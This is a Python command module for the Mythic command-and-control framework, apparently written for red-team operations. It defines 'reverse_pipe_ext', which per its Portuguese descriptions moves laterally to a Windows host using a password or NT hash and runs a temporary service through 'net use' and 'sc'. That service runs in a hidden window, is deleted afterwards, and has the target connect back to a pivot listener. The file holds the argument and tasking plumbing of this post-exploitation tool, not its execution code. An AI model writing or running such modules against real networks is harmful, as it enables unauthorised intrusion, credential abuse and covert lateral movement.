from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json


class ReversePipeExtArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="target",
                type=ParameterType.String,
                description="Alvo que vai CONECTAR de saida ao pivô",
                default_value="",
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
            CommandParameter(
                name="username",
                type=ParameterType.String,
                description="Usuario no alvo (trigger)",
                default_value="",
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
            CommandParameter(
                name="password",
                type=ParameterType.String,
                description="Senha (net use + sc no alvo)",
                default_value="",
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
            CommandParameter(
                name="nthash",
                type=ParameterType.String,
                description="NT hash (melhor esforço + fallback atexec)",
                default_value="",
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
            CommandParameter(
                name="domain",
                type=ParameterType.String,
                description="Dominio ou . / vazio = local",
                default_value="",
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
            CommandParameter(
                name="listen_ip",
                type=ParameterType.String,
                description="IP do pivô que o ALVO deve alcançar (auto se vazio)",
                default_value="",
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
            CommandParameter(
                name="listen_port",
                type=ParameterType.Number,
                description="Porta TCP no pivô",
                default_value=9445,
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
            CommandParameter(
                name="bind_host",
                type=ParameterType.String,
                description="Bind local do listener (0.0.0.0)",
                default_value="0.0.0.0",
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
            CommandParameter(
                name="channel",
                type=ParameterType.String,
                description="tcp | smb_note",
                default_value="tcp",
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
            CommandParameter(
                name="window",
                type=ParameterType.String,
                description="hidden | console",
                default_value="hidden",
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
            CommandParameter(
                name="mode",
                type=ParameterType.String,
                description="full | listen_only | trigger_only | status | stop",
                default_value="full",
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
            CommandParameter(
                name="payload",
                type=ParameterType.String,
                description="cmd (probe whoami via TCP) — v1 evidencia de path",
                default_value="cmd",
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
            CommandParameter(
                name="service_name",
                type=ParameterType.String,
                description="Nome do servico temporario no alvo",
                default_value="",
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
            CommandParameter(
                name="delete_after",
                type=ParameterType.Boolean,
                description="Remove servico apos start",
                default_value=True,
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
            CommandParameter(
                name="timeout_sec",
                type=ParameterType.Number,
                description="Segundos aguardando callback",
                default_value=45,
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
            CommandParameter(
                name="socks_port",
                type=ParameterType.Number,
                description="Ref SOCKS",
                default_value=7005,
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
        ]

    async def parse_arguments(self):
        defaults = {
            "target": "",
            "username": "",
            "password": "",
            "nthash": "",
            "domain": "",
            "listen_ip": "",
            "listen_port": 9445,
            "bind_host": "0.0.0.0",
            "channel": "tcp",
            "window": "hidden",
            "mode": "full",
            "payload": "cmd",
            "service_name": "",
            "delete_after": True,
            "timeout_sec": 45,
            "socks_port": 7005,
        }
        if self.command_line and self.command_line.strip().startswith("{"):
            d = json.loads(self.command_line)
            for k, v in defaults.items():
                val = d.get(k, v)
                if isinstance(v, bool):
                    self.add_arg(k, val, ParameterType.Boolean)
                elif isinstance(v, int):
                    self.add_arg(k, val, ParameterType.Number)
                else:
                    self.add_arg(k, val if val is not None else v)
        else:
            for k, v in defaults.items():
                if isinstance(v, bool):
                    self.add_arg(k, v, ParameterType.Boolean)
                elif isinstance(v, int):
                    self.add_arg(k, v, ParameterType.Number)
                else:
                    self.add_arg(k, v)


class ReversePipeExtCommand(CommandBase):
    cmd = "reverse_pipe_ext"
    needs_admin = False
    help_cmd = (
        'reverse_pipe_ext {"mode":"full","target":"...","username":"...","password":"...",'
        '"listen_port":9445,"window":"hidden"}'
    )
    description = (
        "Reverse path pivô←alvo: listener TCP no agent + trigger SCM no alvo (saida).\n"
        "Nao depende de HTTPS C2 no alvo nem de WinRM interativo.\n"
        "mode: full|listen_only|trigger_only|status|stop\n"
        "Auth trigger: password|nthash | MITRE T1571 / T1572 / T1569.002"
    )
    version = 1
    author = "@wtechsec"
    argument_class = ReversePipeExtArguments
    attackmapping = ["T1571", "T1572", "T1569.002", "T1021.002"]
    attributes = CommandAttributes(
        supported_python_versions=["Python 3.8"],
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        mode = taskData.args.get_arg("mode") or "full"
        t = taskData.args.get_arg("target") or "-"
        p = taskData.args.get_arg("listen_port") or 9445
        response.DisplayParams = "{} {} :{}".format(mode, t, p)
        return response

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        raw = ""
        if response is not None:
            raw = (
                response.decode()
                if isinstance(response, (bytes, bytearray))
                else str(response)
            )
        if raw:
            await SendMythicRPCResponseCreate(
                MythicRPCResponseCreateMessage(
                    TaskID=task.Task.ID, Response=raw.encode()
                )
            )
        return resp
